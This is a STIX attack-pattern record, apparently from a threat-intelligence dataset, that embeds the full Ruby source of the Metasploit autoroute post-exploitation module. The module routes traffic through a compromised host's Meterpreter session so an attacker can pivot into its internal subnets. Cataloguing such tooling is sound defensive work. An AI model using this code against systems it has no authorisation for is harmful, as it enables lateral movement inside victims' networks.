{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--06a782b0-3898-48ef-bc8a-71bc92d36c11",
    "created": "2024-08-14T16:33:18.005133Z",
    "modified": "2024-08-14T16:33:18.005137Z",
    "name": "Multi Manage Network Route via Meterpreter Session",
    "description": " This module manages session routing via an existing Meterpreter session. It enables other modules to 'pivot' through a compromised host when connecting to the named NETWORK and SUBMASK. Autoadd will search a session for valid subnets from the routing table and interface list then add routes to them. Default will add a default route so that all TCP/IP traffic not specified in the MSF routing table will be routed through the session when pivoting. See documentation for more 'info -d' and click 'Knowledge Base'  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/autoroute.rb",
            "external_id": "autoroute.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Manage Network Route via Meterpreter Session',\n        'Description' => %q{\n          This module manages session routing via an existing\n          Meterpreter session. It enables other modules to 'pivot' through a\n          compromised host when connecting to the named NETWORK and SUBMASK.\n          Autoadd will search a session for valid subnets from the routing table\n          and interface list then add routes to them. Default will add a default\n          route so that all TCP/IP traffic not specified in the MSF routing table\n          will be routed through the session when pivoting. See documentation for more\n          'info -d' and click 'Knowledge Base'\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'todb',\n          'Josh Hale \"sn0wfa11\" <jhale85446[at]gmail.com>'\n        ],\n        'SessionTypes' => [ 'meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_net_config_get_interfaces\n              stdapi_net_config_get_routes\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('SUBNET', [false, 'Subnet (IPv4, for example, 10.10.10.0)', nil]),\n        OptString.new('NETMASK', [false, 'Netmask (IPv4 as \"255.255.255.0\" or CIDR as \"/24\"', '255.255.255.0']),\n        OptEnum.new('CMD', [true, 'Specify the autoroute command', 'autoadd', ['add', 'autoadd', 'print', 'delete', 'default']])\n      ]\n    )\n  end\n\n  # Get the CMD string vs ACTION\n  #\n  # Backwards compatability: This was changed because the option name of \"ACTION\"\n  # is special for some things, and indicates the :action attribute, not a datastore option.\n  # However, this is a semi-popular module, though, so I'd prefer not to break people's\n  # RC scripts that set ACTION. Note that ACTION is preferred over CMD.\n  #\n  # TODO: The better solution is to use 'Action' and 'DefaultAction' info elements,\n  # but there are some squirelly problems right now with rendering these for post modules.\n  #\n  # @return [string class] cmd string\n  def route_cmd\n    if datastore['ACTION'].to_s.empty?\n      datastore['CMD'].to_s.downcase.to_sym\n    else\n      wlog(\"Warning, deprecated use of 'ACTION' datastore option for #{fullname}'. Use 'CMD' instead.\")\n      datastore['ACTION'].to_s.downcase.to_sym\n    end\n  end\n\n  # Run Method for when run command is issued\n  #\n  # @return [void] A useful return value is not expected here\n  def run\n    return unless session_good?\n\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n\n    case route_cmd\n    when :print\n      print_routes\n    when :add\n      if validate_cmd(datastore['SUBNET'], netmask)\n        print_status('Adding a route to %s/%s...' % [datastore['SUBNET'], netmask])\n        add_route(datastore['SUBNET'], netmask)\n      end\n    when :autoadd\n      autoadd_routes\n    when :default\n      add_default\n    when :delete\n      if datastore['SUBNET']\n        print_status('Deleting route to %s/%s...' % [datastore['SUBNET'], netmask])\n        delete_route(datastore['SUBNET'], netmask)\n      else\n        delete_all_routes\n      end\n    end\n  end\n\n  # Delete all routes from framework routing table.\n  #\n  # @return [void] A useful return value is not expected here\n  def delete_all_routes\n    if !Rex::Socket::SwitchBoard.routes.empty?\n      print_status(\"Deleting all routes associated with session: #{session.sid}.\")\n      loop do\n        count = 0\n        Rex::Socket::SwitchBoard.each do |route|\n          if route.comm == session\n            print_status(\"Deleting: #{route.subnet}/#{route.netmask}\")\n            delete_route(route.subnet, route.netmask)\n          end\n        end\n        Rex::Socket::SwitchBoard.each do |route|\n          count += 1 if route.comm == session\n        end\n        break if count == 0\n      end\n      print_status('Deleted all routes')\n    else\n      print_status('No routes associated with this session to delete.')\n    end\n  end\n\n  # Print all of the active routes defined on the framework\n  #\n  # Identical functionality to command_dispatcher/core.rb, and\n  # nearly identical code\n  #\n  # @return [void] A useful return value is not expected here\n  def print_routes\n    # IPv4 Table\n    tbl_ipv4 = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header' => 'IPv4 Active Routing Table',\n      'Prefix' => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Columns' =>\n        [\n          'Subnet',\n          'Netmask',\n          'Gateway',\n        ],\n      'ColProps' =>\n        {\n          'Subnet' => { 'Width' => 17 },\n          'Netmask' => { 'Width' => 17 }\n        }\n    )\n\n    # IPv6 Table\n    tbl_ipv6 = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header' => 'IPv6 Active Routing Table',\n      'Prefix' => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Columns' =>\n        [\n          'Subnet',\n          'Netmask',\n          'Gateway',\n        ],\n      'ColProps' =>\n        {\n          'Subnet' => { 'Width' => 17 },\n          'Netmask' => { 'Width' => 17 }\n        }\n    )\n\n    # Populate Route Tables\n    Rex::Socket::SwitchBoard.each do |route|\n      if route.comm.is_a?(Msf::Session)\n        gw = \"Session #{route.comm.sid}\"\n      else\n        gw = route.comm.name.split(/::/)[-1]\n      end\n\n      tbl_ipv4 << [ route.subnet, route.netmask, gw ] if Rex::Socket.is_ipv4?(route.netmask)\n      tbl_ipv6 << [ route.subnet, route.netmask, gw ] if Rex::Socket.is_ipv6?(route.netmask)\n    end\n\n    # Print Route Tables\n    print_status(tbl_ipv4.to_s) if !tbl_ipv4.rows.empty?\n    print_status(tbl_ipv6.to_s) if !tbl_ipv6.rows.empty?\n    if (tbl_ipv4.rows.length + tbl_ipv6.rows.length) < 1\n      print_status('There are currently no routes defined.')\n    elsif tbl_ipv4.rows.empty? && !tbl_ipv6.rows.empty?\n      print_status('There are currently no IPv4 routes defined.')\n    elsif !tbl_ipv4.rows.empty? && tbl_ipv6.rows.empty?\n      print_status('There are currently no IPv6 routes defined.')\n    end\n  end\n\n  # Validation check on an IPv4 address\n  #\n  # Yet another IP validator. I'm sure there's some Rex\n  # function that can just do this.\n  #\n  # @return [string class] IPv4 subnet\n  def check_ip(ip = nil)\n    return false if (ip.nil? || ip.strip.empty?)\n\n    begin\n      rw = Rex::Socket::RangeWalker.new(ip.strip)\n      (rw.valid? && rw.length == 1) ? true : false\n    rescue StandardError\n      false\n    end\n  end\n\n  # Converts a CIDR value to a netmask\n  #\n  # @return [string class] IPv4 netmask\n  def cidr_to_netmask(cidr)\n    int = cidr.gsub(/\\x2f/, '').to_i\n    Rex::Socket.addr_ctoa(int)\n  end\n\n  # Validates the user input 'NETMASK'\n  #\n  # @return [string class] IPv4 netmask\n  def netmask\n    case datastore['NETMASK']\n    when /^\\x2f[0-9]{1,2}/\n      cidr_to_netmask(datastore['NETMASK'])\n    when /^[0-9]{1,3}\\.[0-9]/ # Close enough, if it's wrong it'll fail out later.\n      datastore['NETMASK']\n    else\n      '255.255.255.0'\n    end\n  end\n\n  # This function adds a route to the framework routing table\n  #\n  # @subnet [string class] subnet to add\n  # @netmask [string class] netmask\n  # @origin [string class] where route is coming from. Nill for none.\n  #\n  # @return [true]  If added\n  # @return [false] If not\n  def add_route(subnet, netmask, origin = nil)\n    if origin\n      origin = \" from #{origin}\"\n    else\n      origin = ''\n    end\n\n    begin\n      if Rex::Socket::SwitchBoard.add_route(subnet, netmask, session)\n        print_good(\"Route added to subnet #{subnet}/#{netmask}#{origin}.\")\n        return true\n      else\n        print_error(\"Could not add route to subnet #{subnet}/#{netmask}#{origin}.\")\n        return false\n      end\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Could not add route to subnet #{subnet}/#{netmask}#{origin}.\")\n      print_error(\"#{e.class} #{e.message}\\n#{e.backtrace * \"\\n\"}\")\n      return false\n    end\n  end\n\n  # This function removes a route to the framework routing table\n  #\n  # @subnet [string class] subnet to add\n  # @netmask [string class] netmask\n  # @origin [string class] where route is coming from.\n  #\n  # @return [true]  If removed\n  # @return [false] If not\n  def delete_route(subnet, netmask)\n    Rex::Socket::SwitchBoard.remove_route(subnet, netmask, session)\n  rescue ::Rex::Post::Meterpreter::RequestError => e\n    print_error(\"Could not remove route to subnet #{subnet}/#{netmask}\")\n    print_error(\"#{e.class} #{e.message}\\n#{e.backtrace * \"\\n\"}\")\n    return false\n  end\n\n  # This function will exclude loopback, multicast, and default routes\n  #\n  # @subnet [string class] IPv4 subnet or address to check\n  # @netmask [string class] IPv4 netmask to check\n  #\n  # @return [true]  If good to add\n  # @return [false] If not\n  def is_routable?(subnet, netmask)\n    if subnet =~ /^224\\.|^127\\./\n      return false\n    elsif subnet == '0.0.0.0'\n      return false\n    elsif netmask == '255.255.255.255'\n      return false\n    end\n\n    return true\n  end\n\n  # Search for valid subnets on the target and attempt\n  # add a route to each. (Operation from auto_add_route plugin.)\n  #\n  # @return [void] A useful return value is not expected here\n  def autoadd_routes\n    return unless route_compatible?\n\n    print_status('Searching for subnets to autoroute.')\n    found = false\n\n    begin\n      session.net.config.each_route do |route|\n        next unless (Rex::Socket.is_ipv4?(route.subnet) && Rex::Socket.is_ipv4?(route.netmask)) # Pick out the IPv4 addresses\n\n        subnet = get_subnet(route.subnet, route.netmask) # Make sure that the subnet is actually a subnet and not an IP address. Android phones like to send over their IP.\n        next unless is_routable?(subnet, route.netmask)\n\n        if !Rex::Socket::SwitchBoard.route_exists?(subnet, route.netmask) && add_route(subnet, route.netmask, \"host's routing table\")\n          found = true\n        end\n      end\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      print_status('Unable to get routes from session, trying interface list.')\n    end\n\n    if !autoadd_interface_routes && !found # Check interface list for more possible routes\n      print_status('Did not find any new subnets to add.')\n    end\n  end\n\n  # Look at network interfaces as options for additional routes.\n  # If the routes are not already included they will be added.\n  #\n  # @return [true] A route from the interface list was added\n  # @return [false] No additional routes were added\n  def autoadd_interface_routes\n    return unless interface_compatible?\n\n    found = false\n\n    begin\n      session.net.config.each_interface do |interface| # Step through each of the network interfaces\n        (0..(interface.addrs.size - 1)).each do |index| # Step through the addresses for the interface\n          ip_addr = interface.addrs[index]\n          netmask = interface.netmasks[index]\n\n          next unless (Rex::Socket.is_ipv4?(ip_addr) && Rex::Socket.is_ipv4?(netmask)) # Pick out the IPv4 addresses\n          next unless is_routable?(ip_addr, netmask)\n\n          subnet = get_subnet(ip_addr, netmask)\n\n          if subnet && !Rex::Socket::SwitchBoard.route_exists?(subnet, netmask) && add_route(subnet, netmask, interface.mac_name)\n            found = true\n          end\n        end\n      end\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      print_error('Unable to get interface information from session.')\n    end\n    return found\n  end\n\n  # Take an IP address and a netmask and return the appropreate subnet \"Network\"\n  #\n  # @ip_addr [string class] Input IPv4 Address\n  # @netmask [string class] Input IPv4 Netmask\n  #\n  # @return [string class] The subnet related to the IP address and netmask\n  # @return [nil class] Something is out of range\n  def get_subnet(ip_addr, netmask)\n    return nil if !validate_cmd(ip_addr, netmask) # make sure IP and netmask are valid\n\n    nets = ip_addr.split('.')\n    masks = netmask.split('.')\n    output = ''\n\n    4.times do |index|\n      octet = get_subnet_octet(int_or_nil(nets[index]), int_or_nil(masks[index]))\n      return nil if !octet\n\n      output << octet.to_s\n      output << '.' if index < 3\n    end\n    return output\n  end\n\n  # Input an octet of an IPv4 address and the cooresponding octet of the\n  # IPv4 netmask then return the appropreate subnet octet.\n  #\n  # @net  [integer class] IPv4 address octet\n  # @mask [integer class] Ipv4 netmask octet\n  #\n  # @return [integer class] Octet of the subnet\n  # @return [nil class] If an input is nil\n  def get_subnet_octet(net, mask)\n    return nil if !net || !mask\n\n    subnet_range = 256 - mask  # This is the address space of the subnet octet\n\n    multi = net / subnet_range # Integer division to get the multiplier needed to determine subnet octet\n\n    return(subnet_range * multi) # Multiply to get subnet octet\n  end\n\n  # Take a string of numbers and converts it to an integer.\n  #\n  # @string [string class] Input string, needs to be all numbers (0..9)\n  #\n  # @return [integer class] Integer representation of the number string\n  # @return [nil class] string contains non-numbers, cannot convert\n  def int_or_nil(string)\n    num = string.to_i\n    num if num.to_s == string\n  end\n\n  # Add a default route to the routing table\n  #\n  # @return [void] A useful return value is not expected here\n  def add_default\n    subnet = '0.0.0.0'\n    mask = '0.0.0.0'\n\n    switch_board = Rex::Socket::SwitchBoard.instance\n    print_status('Attempting to add a default route.')\n\n    if !switch_board.route_exists?(subnet, mask)\n      add_route(subnet, mask)\n    end\n  end\n\n  # Checks to see if the session is ready.\n  #\n  # Some Meterpreter types, like python, can take a few seconds to\n  # become fully established. This gracefully exits if the session\n  # is not ready yet.\n  #\n  # @return [true class] Session is good\n  # @return [false class] Session is not\n  def session_good?\n    if !session.info\n      print_error('Session is not yet fully established. Try again in a bit.')\n      return false\n    end\n    return true\n  end\n\n  # Checks to see if the session has routing capabilities\n  #\n  # @return [true class] Session has routing capabilities\n  # @return [false class] Session does not\n  def route_compatible?\n    session.respond_to?(:net) &&\n      session.net.config.respond_to?(:each_route)\n  end\n\n  # Checks to see if the session has capabilities of accessing network interfaces\n  #\n  # @return [true class] Session has ability to access network interfaces\n  # @return [false class] Session does not\n  def interface_compatible?\n    session.respond_to?(:net) &&\n      session.net.config.respond_to?(:each_interface)\n  end\n\n  # Validates the command options\n  #\n  # @return [true class] Everything is good\n  # @return [false class] Not so much\n  def validate_cmd(subnet = nil, netmask = nil)\n    if subnet.nil?\n      print_error 'Missing subnet option'\n      return false\n    end\n\n    unless check_ip(subnet)\n      print_error 'Subnet invalid (must be IPv4)'\n      return false\n    end\n\n    if (netmask && !Rex::Socket.addr_atoc(netmask))\n      print_error 'Netmask invalid (must define contiguous IP addressing)'\n      return false\n    end\n\n    if (netmask && !check_ip(netmask))\n      print_error 'Netmask invalid'\n      return false\n    end\n    return true\n  end\nend\n"
}